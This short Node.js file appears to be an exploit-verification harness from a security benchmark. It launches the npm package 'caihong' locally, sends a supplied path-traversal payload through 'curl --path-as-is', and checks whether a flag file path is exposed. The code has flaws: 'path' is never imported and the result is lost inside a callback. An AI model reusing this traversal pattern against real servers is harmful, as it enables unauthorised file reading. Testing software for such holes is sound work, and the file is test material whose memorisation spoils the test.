const { exec } = require("child_process");
const sleep = require("sleep");

function exploitFunction(payload) {
  try {
    exec("fuser -k 8888/tcp", () => {}); // Kill any existing server on port 8888
  } catch (e) {}

  const serverCommand = `node ./node_modules/caihong/index.js`;
  exec(serverCommand, (error, stdout) => {
    sleep.sleep(2);

    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
    exec(attack_string, (error, stdout) => {
      let out = false;
      if (stdout.includes(path.resolve(__dirname, "../flag.html"))) {
        out = true;
      }
      return out;
    });
  });
}

module.exports = { exploitFunction };